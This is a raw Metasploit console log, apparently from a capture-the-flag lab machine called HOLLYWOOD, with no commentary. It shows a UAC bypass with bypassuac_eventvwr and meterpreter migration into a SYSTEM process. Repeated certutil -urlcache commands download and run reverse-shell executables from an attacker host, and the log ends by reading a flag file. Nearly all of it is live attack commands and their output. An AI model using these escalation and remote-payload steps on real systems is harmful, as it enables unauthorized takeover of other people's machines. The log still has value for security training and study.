+  4         meterpreter x86/windows  HOLLYWOOD\User @ HOLLYWOOD                                                        10.66.67.46:5555 -> 10.150.150.219:49338 (10.150.150.219)
+
+[4mmsf6[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> sessions 4
+[0m[1m[34m[*][0m Starting interaction with 4...
+
+[4mmeterpreter[0m > get[K[K[Kshell[K[K[K[K[Kps
+[0m
+Process List
+============
+
+ PID   PPID  Name                  Arch  Session  User                          Path
+ ---   ----  ----                  ----  -------  ----                          ----
+ 0     0     [System Process]                                                   
+ 4     0     System                x86   0                                      
+ 244   4     smss.exe              x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
+ 328   312   csrss.exe             x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 364   3876  xampp-control.exe     x86   1        HOLLYWOOD\User                C:\xampp\xampp-control.exe
+ 400   3876  cmd.exe               x86   1        HOLLYWOOD\User                C:\Windows\system32\cmd.exe
+ 408   312   wininit.exe           x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
+ 416   400   csrss.exe             x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
+ 464   400   winlogon.exe          x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
+ 512   408   services.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
+ 520   408   lsass.exe             x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
+ 528   408   lsm.exe               x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
+ 624   512   svchost.exe           x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
+ 684   512   vmacthlp.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmacthlp.exe
+ 728   512   svchost.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 816   512   svchost.exe           x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
+ 864   512   svchost.exe           x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 892   512   svchost.exe           x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 912   416   conhost.exe           x86   1        HOLLYWOOD\User                C:\Windows\system32\conhost.exe
+ 916   512   svchost.exe           x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
+ 1028  512   svchost.exe           x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
+ 1200  512   svchost.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 1224  512   svchost.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
+ 1308  5092  cmd.exe               x86   1        HOLLYWOOD\User                C:\Windows\system32\cmd.exe
+ 1384  512   spoolsv.exe           x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
+ 1412  512   svchost.exe           x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 1504  512   svchost.exe           x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 1612  416   conhost.exe           x86   1        HOLLYWOOD\User                C:\Windows\system32\conhost.exe
+ 1664  512   splunkd.exe           x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe
+ 1700  512   dllhost.exe           x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\dllhost.exe
+ 1728  328   conhost.exe           x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
+ 1760  512   VGAuthService.exe     x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
+ 1816  512   vmtoolsd.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
+ 1832  624   WmiPrvSE.exe          x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\wbem\wmiprvse.exe
+ 1880  364   mysqld.exe            x86   1        HOLLYWOOD\User                c:\xampp\mysql\bin\mysqld.exe
+ 2240  512   SearchIndexer.exe     x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchIndexer.exe
+ 2520  1664  splunk-winevtlog.exe  x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\SplunkUniversalForwarder\bin\splunk-winevtlog.exe
+ 2640  364   FileZillaServer.exe   x86   1        HOLLYWOOD\User                c:\xampp\filezillaftp\filezillaserver.exe
+ 2676  364   mercury.exe           x86   1        HOLLYWOOD\User                c:\xampp\MercuryMail\mercury.exe
+ 2748  400   java.exe              x86   1        HOLLYWOOD\User                C:\Program Files\Common Files\Oracle\Java\javapath\java.exe
+ 2824  3876  jusched.exe           x86   1        HOLLYWOOD\User                C:\Program Files\Common Files\Java\Java Update\jusched.exe
+ 2908  3916  httpd.exe             x86   1        HOLLYWOOD\User                C:\xampp\apache\bin\httpd.exe
+ 3112  416   conhost.exe           x86   1        HOLLYWOOD\User                C:\Windows\system32\conhost.exe
+ 3124  416   conhost.exe           x86   1        HOLLYWOOD\User                C:\Windows\system32\conhost.exe
+ 3156  3876  vmtoolsd.exe          x86   1        HOLLYWOOD\User                C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
+ 3472  364   cmd.exe               x86   1        HOLLYWOOD\User                C:\Windows\System32\cmd.exe
+ 3548  512   taskhost.exe          x86   1        HOLLYWOOD\User                C:\Windows\system32\taskhost.exe
+ 3776  3472  java.exe              x86   1        HOLLYWOOD\User                C:\Program Files\Java\jre1.8.0_231\bin\java.exe
+ 3784  416   conhost.exe           x86   1        HOLLYWOOD\User                C:\Windows\system32\conhost.exe
+ 3820  512   svchost.exe           x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
+ 3840  864   dwm.exe               x86   1        HOLLYWOOD\User                C:\Windows\system32\Dwm.exe
+ 3856  416   conhost.exe           x86   1        HOLLYWOOD\User                C:\Windows\system32\conhost.exe
+ 3876  3608  explorer.exe          x86   1        HOLLYWOOD\User                C:\Windows\Explorer.EXE
+ 3916  364   httpd.exe             x86   1        HOLLYWOOD\User                c:\xampp\apache\bin\httpd.exe
+ 3968  512   wmpnetwk.exe          x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Program Files\Windows Media Player\wmpnetwk.exe
+ 4080  512   svchost.exe           x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
+ 4132  416   conhost.exe           x86   1        HOLLYWOOD\User                C:\Windows\system32\conhost.exe
+ 4504  2748  cmd.exe               x86   1        HOLLYWOOD\User                C:\Windows\system32\cmd.exe
+ 5092  4504  rev.exe               x86   1        HOLLYWOOD\User                C:\Users\Public\Downloads\rev.exe
+ 5296  4420  powershell.exe        x86   1        HOLLYWOOD\User                C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe
+ 5488  512   taskhost.exe          x86   1        HOLLYWOOD\User                C:\Windows\system32\taskhost.exe
+
+[4mmeterpreter[0m > migrate 1384
+[0m[1m[34m[*][0m Migrating from 5296 to 1384...
+[1m[34m[*][0m Migration completed successfully.
+[4mmeterpreter[0m > getuid
+[0mServer username: NT AUTHORITY\SYSTEM
+[4mmeterpreter[0m > shell
+[0mProcess 2068 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>cd C:\
+
+C:\>ls
+'ls' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 021A-9C32
+
+ Directory of C:\
+
+06/11/2009  05:42 AM                24 autoexec.bat
+06/11/2009  05:42 AM                10 config.sys
+10/04/2019  07:29 PM    <DIR>          ESD
+11/07/2007  08:00 AM            17,734 eula.1028.txt
+11/07/2007  08:00 AM            17,734 eula.1031.txt
+11/07/2007  08:00 AM            10,134 eula.1033.txt
+11/07/2007  08:00 AM            17,734 eula.1036.txt
+11/07/2007  08:00 AM            17,734 eula.1040.txt
+11/07/2007  08:00 AM               118 eula.1041.txt
+11/07/2007  08:00 AM            17,734 eula.1042.txt
+11/07/2007  08:00 AM            17,734 eula.2052.txt
+11/07/2007  08:00 AM            17,734 eula.3082.txt
+11/07/2007  08:00 AM             1,110 globdata.ini
+11/07/2007  08:03 AM           562,688 install.exe
+11/07/2007  08:00 AM               843 install.ini
+11/07/2007  08:03 AM            76,304 install.res.1028.dll
+11/07/2007  08:03 AM            96,272 install.res.1031.dll
+11/07/2007  08:03 AM            91,152 install.res.1033.dll
+11/07/2007  08:03 AM            97,296 install.res.1036.dll
+11/07/2007  08:03 AM            95,248 install.res.1040.dll
+11/07/2007  08:03 AM            81,424 install.res.1041.dll
+11/07/2007  08:03 AM            79,888 install.res.1042.dll
+11/07/2007  08:03 AM            75,792 install.res.2052.dll
+11/07/2007  08:03 AM            96,272 install.res.3082.dll
+07/14/2009  10:37 AM    <DIR>          PerfLogs
+10/28/2019  05:17 PM    <DIR>          Program Files
+01/24/2019  04:51 PM    <DIR>          sysprep
+03/21/2019  04:58 PM    <DIR>          Users
+11/07/2007  08:00 AM             5,686 vcredist.bmp
+11/07/2007  08:09 AM         1,442,522 VC_RED.cab
+11/07/2007  08:12 AM           232,960 VC_RED.MSI
+10/04/2019  07:29 PM    <DIR>          Windows
+11/14/2018  05:37 PM    <DIR>          xampp
+              26 File(s)      3,169,881 bytes
+               7 Dir(s)  44,514,426,880 bytes free
+
+C:\>cd Users
+
+C:\Users>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 021A-9C32
+
+ Directory of C:\Users
+
+03/21/2019  04:58 PM    <DIR>          .
+03/21/2019  04:58 PM    <DIR>          ..
+04/12/2011  10:24 AM    <DIR>          Public
+11/13/2018  05:02 PM    <DIR>          User
+03/28/2019  04:52 PM    <DIR>          User.WIN-9R2RLQ9A2RS
+               0 File(s)              0 bytes
+               5 Dir(s)  44,514,361,344 bytes free
+
+C:\Users>powershell --bypass
+Missing expression after unary operator '--'.
+At line:1 char:3
++ -- <<<< bypass
+    + CategoryInfo          : ParserError: (--:String) [], ParentContainsError 
+   RecordException
+    + FullyQualifiedErrorId : MissingExpressionAfterOperator
+ 
+
+C:\Users>cd Public\Downloads
+
+C:\Users\Public\Downloads>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 021A-9C32
+
+ Directory of C:\Users\Public\Downloads
+
+02/26/2021  08:12 AM    <DIR>          .
+02/26/2021  08:12 AM    <DIR>          ..
+02/26/2021  08:12 AM            73,802 rev.exe
+               1 File(s)         73,802 bytes
+               2 Dir(s)  44,514,361,344 bytes free
+
+C:\Users\Public\Downloads>rev.exe
+
+C:\Users\Public\Downloads>certutil -urlcache -f http://10.66.67.46/rev-stageless.exe rev-stageless.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+C:\Users\Public\Downloads>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 021A-9C32
+
+ Directory of C:\Users\Public\Downloads
+
+02/26/2021  08:26 AM    <DIR>          .
+02/26/2021  08:26 AM    <DIR>          ..
+02/26/2021  08:26 AM           250,368 rev-stageless.exe
+02/26/2021  08:12 AM            73,802 rev.exe
+               2 File(s)        324,170 bytes
+               2 Dir(s)  44,513,787,904 bytes free
+
+C:\Users\Public\Downloads>rev-stageless.exe
+
+C:\Users\Public\Downloads>certutil -urlcache -f http://10.66.67.46/rev-powershell.exe rev-powershell.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+C:\Users\Public\Downloads>rev-powershell.exe
+
+C:\Users\Public\Downloads>certutil -urlcache -f http://10.66.67.46/rev-powershell.exe rev-powershell.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+C:\Users\Public\Downloads>rev-powershell.exe
+
+C:\Users\Public\Downloads>certutil -urlcache -f http://10.66.67.46/rev-tcp.exe rev-tcp.exe
+****  Online  ****
+CertUtil: -URLCache command completed successfully.
+
+C:\Users\Public\Downloads>rev-tcp.exe
+
+C:\Users\Public\Downloads>whoami
+nt authority\system
+
+C:\Users\Public\Downloads>cd C:\
+
+C:\>dir "\FLAG9.txt" \s
+ Volume in drive C has no label.
+ Volume Serial Number is 021A-9C32
+
+ Directory of C:\
+
+
+ Directory of C:\
+
+File Not Found
+
+C:\>dir "\FLAG9.txt" /s
+ Volume in drive C has no label.
+ Volume Serial Number is 021A-9C32
+
+ Directory of C:\Users\User\Documents
+
+03/22/2019  04:12 PM                43 FLAG9.txt
+               1 File(s)             43 bytes
+
+     Total Files Listed:
+               1 File(s)             43 bytes
+               0 Dir(s)  44,513,120,256 bytes free
+
+C:\>cd C:\Users\User\Documents
+
+C:\Users\User\Documents>type FLAG9.txt
+b017cd11a8def6b4bae78b0a96a698deda09f033 
+
+C:\Users\User\Documents>
+Background channel 1? [y/N]  [4mmeterpreter[0m > 
+Background session 4? [y/N]  y
+[0m[1m[31m[-][0m Unknown command: y.
+[4mmsf6[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> sessions
+[0m
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                                                       Connection
+  --  ----  ----                     -----------                                                                       ----------
+  2         shell java/linux         Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.66.67.46:4444 -> 10.150.150.219:49326 (10.150.150.219)
+  3         meterpreter x86/windows  HOLLYWOOD\User @ HOLLYWOOD                                                        10.66.67.46:4444 -> 10.150.150.219:49335 (10.150.150.219)
+  4         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ HOLLYWOOD                                                   10.66.67.46:5555 -> 10.150.150.219:49338 (10.150.150.219)
+
+[4mmsf6[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> sessions 2
+[0m[1m[34m[*][0m Starting interaction with 2...
+
+
+C:\Users\Public\Downloads>cd ../../User
+
+C:\Users\User>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 021A-9C32
+
+ Directory of C:\Users\User
+
+11/13/2018  05:02 PM    <DIR>          .
+11/13/2018  05:02 PM    <DIR>          ..
+11/15/2018  02:21 PM    <DIR>          Contacts
+11/15/2018  02:21 PM    <DIR>          Desktop
+03/22/2019  04:12 PM    <DIR>          Documents
+11/15/2018  02:21 PM    <DIR>          Downloads
+11/15/2018  02:21 PM    <DIR>          Favorites
+11/15/2018  02:21 PM    <DIR>          Links
+11/15/2018  02:21 PM    <DIR>          Music
+11/15/2018  02:21 PM    <DIR>          Pictures
+11/15/2018  02:21 PM    <DIR>          Saved Games
+11/15/2018  02:21 PM    <DIR>          Searches
+11/15/2018  02:21 PM    <DIR>          Videos
+               0 File(s)              0 bytes
+              13 Dir(s)  44,513,120,256 bytes free
+
+C:\Users\User>cd Documents
+
+C:\Users\User\Documents>dir
+ Volume in drive C has no label.
+ Volume Serial Number is 021A-9C32
+
+ Directory of C:\Users\User\Documents
+
+03/22/2019  04:12 PM    <DIR>          .
+03/22/2019  04:12 PM    <DIR>          ..
+03/22/2019  04:12 PM                43 FLAG9.txt
+               1 File(s)             43 bytes
+               2 Dir(s)  44,513,054,720 bytes free
+
+C:\Users\User\Documents>type FLAG9.txt
+b017cd11a8def6b4bae78b0a96a698deda09f033 
+
+C:\Users\User\Documents>
+Background session 2? [y/N]  [4mmsf6[0m exploit([1m[31mwindows/local/bypassuac_eventvwr[0m) [0m> back
+[0m[4mmsf6[0m [0m> spool
+[0mUsage: spool <off>|<filename>
+
+Example:
+  spool /tmp/console.log
+
+[4mmsf6[0m [0m> spool off
+[0m
